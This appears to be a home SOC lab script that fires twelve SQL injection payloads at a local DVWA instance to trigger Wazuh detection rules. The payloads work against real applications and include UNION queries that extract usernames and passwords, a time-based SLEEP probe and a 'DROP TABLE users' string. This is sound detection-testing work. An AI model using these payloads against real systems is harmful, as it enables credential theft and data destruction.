#!/usr/bin/env bash
# 02-dvwa-sqli.sh
# Sends a series of SQL injection payloads against DVWA's vulnerable
# endpoints. Trips Wazuh custom rules 100200 / 100201.
#
# Pre-reqs:
#   1. DVWA must be initialised via http://localhost:8080 (click 'Create Database')
#   2. Set DVWA security level to 'low' under DVWA Security tab.
#   3. Capture an authenticated session cookie and export it:
#        export DVWA_COOKIE='PHPSESSID=...; security=low'

set -euo pipefail

TARGET="${TARGET:-http://127.0.0.1:8080}"
COOKIE="${DVWA_COOKIE:-}"

if [[ -z "$COOKIE" ]]; then
  echo "Set DVWA_COOKIE first. Quick way:"
  echo "  1. Log in at http://localhost:8080  (admin / password)"
  echo "  2. DevTools -> Application -> Cookies -> copy PHPSESSID and security"
  echo "  3. export DVWA_COOKIE='PHPSESSID=xxx; security=low'"
  exit 1
fi

PAYLOADS=(
  "1' OR '1'='1"
  "1' UNION SELECT user, password FROM users--"
  "1' UNION SELECT 1,2--"
  "1' AND 1=1--"
  "1' AND SLEEP(5)--"
  "1'; DROP TABLE users--"
  "%27%20OR%201%3D1--"
  "1' UNION SELECT NULL,version()--"
  "admin'--"
  "1' OR '1'='1' #"
  "' UNION SELECT @@version,@@hostname--"
  "1' AND 1=CONVERT(int,(SELECT user))--"
)

echo "==> Firing ${#PAYLOADS[@]} SQLi payloads at $TARGET"
for p in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$p")
  printf "    %s\n" "$p"
  curl -s -o /dev/null -w "        HTTP %{http_code}\n" \
    -b "$COOKIE" \
    "$TARGET/vulnerabilities/sqli/?id=$encoded&Submit=Submit"
  sleep 0.5
done

echo
echo "Check the Wazuh dashboard. Expected alerts:"
echo "  - rule 31100 / 31108  (web attack signatures)"
echo "  - rule 100200         (home-soc-lab SQLi observed)"
echo "  - rule 100201         (home-soc-lab active SQLi probing)"
